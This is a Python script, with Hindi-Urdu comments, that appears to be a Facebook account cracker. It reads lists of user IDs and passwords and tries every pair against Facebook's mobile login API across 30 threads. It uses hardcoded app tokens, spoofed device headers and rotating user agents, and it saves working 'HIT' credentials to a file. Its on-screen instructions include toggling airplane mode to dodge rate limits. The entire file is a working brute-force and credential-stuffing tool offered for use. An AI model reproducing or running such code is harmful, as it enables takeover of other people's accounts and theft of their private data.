import os
import re
import time
import uuid
import hashlib
import random
import string
import requests
import sys
import json
import urllib
from bs4 import BeautifulSoup
from random import randint as rr
from concurrent.futures import ThreadPoolExecutor as tred
from os import system
from datetime import datetime

modules = ['requests', 'urllib3', 'mechanize', 'rich']
for module in modules:
    try:
        __import__(module)
    except ImportError:
        os.system(f'pip install {module}')

from requests.exceptions import ConnectionError
from requests import api, models, sessions
requests.urllib3.disable_warnings()
os.system('clear')

print('\x1b[1;32m[+] LOADING MODULES...\n')

# ============================================================
# USER-CONFIGURABLE FILE PATHS
# ============================================================
ID_FILE = "ids.txt"           # <-- Yeh file IDs ki list rakhegi (1 ID per line)
PASS_FILE = "passwords.txt"   # <-- Yeh file passwords ki list rakhegi (1 pass per line)
# ============================================================

X = '\x1b[1;37m'
rad = '\x1b[38;5;196m'
G = '\x1b[38;5;46m'
Y = '\x1b[38;5;220m'
PP = '\x1b[38;5;203m'
RR = '\x1b[38;5;196m'
GS = '\x1b[38;5;40m'
W = '\x1b[1;37m'

oks = []
loop = 0

def windows():
    aV = str(random.choice(range(10, 20)))
    A = f"Mozilla/5.0 (Windows; U; Windows NT {str(random.choice(range(5, 7)))}.1; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{str(random.choice(range(8, 12)))}.0.{str(random.choice(range(552, 661)))}.0 Safari/534.{aV}"
    bV = str(random.choice(range(1, 36)))
    bx = str(random.choice(range(34, 38)))
    bz = f'5{bx}.{bV}'
    B = f"Mozilla/5.0 (Windows NT {str(random.choice(range(5, 7)))}.{str(random.choice(['2', '1']))}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12, 42)))}.0.{str(random.choice(range(742, 2200)))}.{str(random.choice(range(1, 120)))} Safari/{bz}"
    cV = str(random.choice(range(1, 36)))
    cx = str(random.choice(range(34, 38)))
    cz = f'5{cx}.{cV}'
    C = f"Mozilla/5.0 (Windows NT 6.{str(random.choice(['2', '1']))}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12, 42)))}.0.{str(random.choice(range(742, 2200)))}.{str(random.choice(range(1, 120)))} Safari/{cz}"
    D = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.{str(random.choice(range(1, 7120)))}.0 Safari/537.36"
    return random.choice([A, B, C, D])

def window1():
    aV = str(random.choice(range(10, 20)))
    A = f"Mozilla/5.0 (Windows; U; Windows NT {random.choice(range(6, 11))}.0; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.0 Safari/534.{aV}"
    bV = str(random.choice(range(1, 36)))
    bx = str(random.choice(range(34, 38)))
    bz = f'5{bx}.{bV}'
    B = f"Mozilla/5.0 (Windows NT {random.choice(range(6, 11))}.{random.choice(['0', '1'])}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.{random.choice(range(50, 200))} Safari/{bz}"
    cV = str(random.choice(range(1, 36)))
    cx = str(random.choice(range(34, 38)))
    cz = f'5{cx}.{cV}'
    C = f"Mozilla/5.0 (Windows NT 6.{random.choice(['0', '1', '2'])}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.{random.choice(range(50, 200))} Safari/{cz}"
    latest_build = rr(6000, 9000)
    latest_patch = rr(100, 200)
    D = f"Mozilla/5.0 (Windows NT {random.choice(['10.0', '11.0'])}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.{latest_build}.{latest_patch} Safari/537.36"
    return random.choice([A, B, C, D])

sys.stdout.write('\x1b]2;𓆩【 FB ID CRACKER (User-Provided Lists) 】𓆪 \x07')

def ____banner____():
    os.system('cls' if 'win' in sys.platform else 'clear')
    colors = ["\033[1;31m", "\033[1;33m", "\033[1;32m", "\033[1;36m", "\033[1;34m", "\033[1;35m"]
    logo = [
        "██████╗░██████╗░██╗░░██╗",
        "██╔══██╗██╔══██╗╚██╗██╔╝",
        "██████╔╝██████╦╝░╚███╔╝░",
        "██╔══██╗██╔══██╗░██╔██╗░",
        "██║░░██║██████╦╝██╔╝╚██╗",
        "╚═╝░░╚═╝╚═════╝░╚═╝░░╚═╝",
    ]
    print("\033[1;31m" + "═" * 65 + "\033[0m")
    for i, line in enumerate(logo):
        print(colors[i % len(colors)] + line + "\033[0m")
    print("\033[1;33m" + "═" * 65 + "\033[0m")
    print("\033[1;36mTOOL : FB CRACKER (USER UPLOADED LISTS)\033[0m")
    print("\033[1;31m" + "═" * 65 + "\033[0m")

def clear():
    os.system('clear')

def creationyear(uid):
    if len(uid) == 15:
        if uid.startswith('1000000000'): return '2009'
        if uid.startswith('100000000'): return '2009'
        if uid.startswith('10000000'): return '2009'
        if uid.startswith(('1000000', '1000001', '1000002', '1000003', '1000004', '1000005')): return '2009'
        if uid.startswith(('1000006', '1000007', '1000008', '1000009')): return '2010'
        if uid.startswith('100001'): return '2010'
        if uid.startswith(('100002', '100003')): return '2011'
        if uid.startswith('100004'): return '2012'
        if uid.startswith(('100005', '100006')): return '2013'
        if uid.startswith(('100007', '100008')): return '2014'
        if uid.startswith('100009'): return '2015'
        if uid.startswith('10001'): return '2016'
        if uid.startswith('10002'): return '2017'
        if uid.startswith('10003'): return '2018'
        if uid.startswith('10004'): return '2019'
        if uid.startswith('10005'): return '2020'
        if uid.startswith('10006'): return '2021'
        if uid.startswith('10009'): return '2023'
        if uid.startswith(('10007', '10008')): return '2022'
        return ''
    elif len(uid) in (9, 10): return '2008'
    elif len(uid) == 8: return '2007'
    elif len(uid) == 7: return '2006'
    elif len(uid) == 14 and uid.startswith('61'): return '2024'
    else: return ''

def linex():
    print("\033[1;31m" + "─" * 65 + "\033[0m")

# ============================================================
# NEW: Load IDs and Passwords from User Files
# ============================================================
def load_ids_from_file(filepath):
    """Fayl se IDs load karta hai (har line par ek ID)"""
    if not os.path.exists(filepath):
        print(f"\n{rad}[!] Error: File '{filepath}' nahi mili!")
        print(f"{Y}Yeh file same directory mein honi chahiye jahan script hai.{W}")
        sys.exit(1)
    
    with open(filepath, 'r') as f:
        ids = [line.strip() for line in f if line.strip()]
    
    # Duplicates hatao
    ids = list(dict.fromkeys(ids))
    
    print(f"\n{G}[+] {len(ids)} IDs load hui: '{filepath}'{W}")
    return ids

def load_passwords_from_file(filepath):
    """Fayl se passwords load karta hai (har line par ek password)"""
    if not os.path.exists(filepath):
        print(f"\n{rad}[!] Error: File '{filepath}' nahi mili!")
        print(f"{Y}Yeh file same directory mein honi chahiye jahan script hai.{W}")
        sys.exit(1)
    
    with open(filepath, 'r') as f:
        passwords = [line.strip() for line in f if line.strip()]
    
    # Duplicates hatao
    passwords = list(dict.fromkeys(passwords))
    
    print(f"{G}[+] {len(passwords)} passwords load hue: '{filepath}'{W}")
    return passwords

# ============================================================
# MODIFIED LOGIN FUNCTIONS (use user-provided passwords)
# ============================================================
def login_with_list(uid, passwords_list):
    """
    Login attempt using user-provided password list.
    Har ID ke liye sare passwords try karta hai jab tak success na ho.
    """
    global loop
    session = requests.session()
    
    for idx, pw in enumerate(passwords_list):
        try:
            sys.stdout.write(f"\r\r\x1b[1;37m\x1b[38;5;196m+\x1b[1;37m(\x1b[1;37mM1\x1b[38;5;196m)\x1b[1;37m Loop:\x1b[38;5;192m{loop}\x1b[38;5;196m | OK:\x1b[38;5;192m{len(oks)}\x1b[38;5;196m | Trying ID: {uid} Pass:{idx+1}/{len(passwords_list)}\x1b[0m")
            sys.stdout.flush()
            
            data = {
                'adid': str(uuid.uuid4()),
                'format': 'json',
                'device_id': str(uuid.uuid4()),
                'cpl': 'true',
                'family_device_id': str(uuid.uuid4()),
                'credentials_type': 'device_based_login_password',
                'error_detail_type': 'button_with_disabled',
                'source': 'device_based_login',
                'email': str(uid),
                'password': str(pw),
                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'generate_session_cookies': '1',
                'meta_inf_fbmeta': '',
                'advertiser_id': str(uuid.uuid4()),
                'currently_logged_in_userid': '0',
                'locale': 'en_US',
                'client_country_code': 'US',
                'method': 'auth.login',
                'fb_api_req_friendly_name': 'authenticate',
                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
                'api_key': '882a8490361da98702bf97a021ddc14d'
            }
            headers = {
                'User-Agent': window1(),
                'Content-Type': 'application/x-www-form-urlencoded',
                'Host': 'graph.facebook.com',
                'X-FB-Net-HNI': '25227',
                'X-FB-SIM-HNI': '29752',
                'X-FB-Connection-Type': 'MOBILE.LTE',
                'X-Tigon-Is-Retry': 'False',
                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;',
                'x-fb-device-group': '5120',
                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                'X-FB-Request-Analytics-Tags': 'graphservice',
                'X-FB-HTTP-Engine': 'Liger',
                'X-FB-Client-IP': 'True',
                'X-FB-Server-Cluster': 'True',
                'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'
            }
            
            res = session.post('https://b-graph.facebook.com/auth/login', data=data, headers=headers, allow_redirects=False).json()
            
            if 'session_key' in res:
                print(f"\n{G}[✓] HIT! {uid} | PW: {pw} | Created: {creationyear(uid)}{W}")
                open('/sdcard/HIT-USER-LIST.txt', 'a').write(f"{uid}|{pw}\n")
                oks.append(uid)
                break
            elif 'www.facebook.com' in res.get('error', {}).get('message', ''):
                print(f"\n{G}[~] MAYBE HIT! {uid} | PW: {pw} | Created: {creationyear(uid)}{W}")
                open('/sdcard/HIT-USER-LIST.txt', 'a').write(f"{uid}|{pw}\n")
                oks.append(uid)
                break
            elif 'password' in res.get('error', {}).get('message', '').lower():
                # Wrong password, continue to next
                pass
        except Exception as e:
            time.sleep(2)  # Rate limit / connection issue pe thoda wait
    
    loop += 1

# ============================================================
# NEW MAIN FUNCTION (User-Provided Lists)
# ============================================================
def crack_with_user_lists():
    """
    Main cracking function using user-uploaded ID and password lists.
    """
    ____banner____()
    
    # Load IDs
    print(f"{Y}[*] Loading IDs from: {ID_FILE}{W}")
    print(f"{Y}[*] Loading passwords from: {PASS_FILE}{W}")
    linex()
    
    id_list = load_ids_from_file(ID_FILE)
    pass_list = load_passwords_from_file(PASS_FILE)
    
    if not id_list:
        print(f"{rad}[!] ID list khali hai. Kuch IDs daalein '{ID_FILE}' mein.{W}")
        sys.exit(1)
    if not pass_list:
        print(f"{rad}[!] Password list khali hai. Kuch passwords daalein '{PASS_FILE}' mein.{W}")
        sys.exit(1)
    
    linex()
    
    print(f"\n{G}{'='*60}")
    print(f"  Total IDs      : {len(id_list)}")
    print(f"  Total Passwords : {len(pass_list)}")
    print(f"  Total Attempts  : {len(id_list) * len(pass_list)}")
    print(f"{'='*60}{W}")
    print(f"\n{Y}[!] Results save honge: /sdcard/HIT-USER-LIST.txt{W}")
    print(f"{Y}[!] Airplane mode use karein best result ke liye{W}")
    print(f"{RR}[!] Ctrl+C press karein kabhi bhi rokhne ke liye{W}")
    linex()
    
    input(f"\n{G}[+] Press Enter to start cracking...{W}")
    
    ____banner____()
    print(f"\n{G}[*] Cracking started with {len(id_list)} IDs × {len(pass_list)} passwords{W}")
    print(f"{G}[*] Threads: 30 (ThreadPoolExecutor){W}")
    linex()
    
    # Threading ke saath chalayein
    with tred(max_workers=30) as pool:
        for uid in id_list:
            pool.submit(login_with_list, uid, pass_list)
    
    print(f"\n{G}[✓] Cracking complete! Total hits: {len(oks)}{W}")
    print(f"{G}[✓] Check: /sdcard/HIT-USER-LIST.txt{W}")

# ============================================================
# MENU
# ============================================================
def main_menu():
    ____banner____()
    print(f'       {Y}MY OWN ID LIST & PASSWORD LIST CRACKER')
    print(f'       {Y}───────────────────────────────────────')
    linex()
    print(f'       {G}[1] Start Cracking with Your Lists')
    print(f'       {G}[2] Instructions (How to use)')
    linex()
    choice = input(f"       {Y}CHOICE {W}: {G}").strip()
    
    if choice == '1':
        crack_with_user_lists()
    elif choice == '2':
        show_instructions()
    else:
        print(f"{rad}[!] Invalid choice!{W}")
        time.sleep(2)
        main_menu()

def show_instructions():
    ____banner____()
    print(f"\n{G}📋 HOW TO USE:{W}")
    print(f"{'='*60}")
    print(f"\n{Y}1. ids.txt file banayein (script k saath same folder mein){W}")
    print(f"   - Har line mein ek Facebook UID likhein")
    print(f"   - Example:")
    print(f"     100000123456789")
    print(f"     100001987654321")
    print(f"     100003112233445")
    print(f"\n{Y}2. passwords.txt file banayein{W}")
    print(f"   - Har line mein ek password likhein")
    print(f"   - Example:")
    print(f"     123456")
    print(f"     123456789")
    print(f"     password123")
    print(f"     qwerty")
    print(f"\n{Y}3. Script run karein aur option 1 select karein{W}")
    print(f"\n{Y}4. Results: /sdcard/HIT-USER-LIST.txt mein save honge{W}")
    print(f"{'='*60}")
    input(f"\n{G}[Press Enter to go back]{W}")
    main_menu()

if __name__ == '__main__':
    main_menu()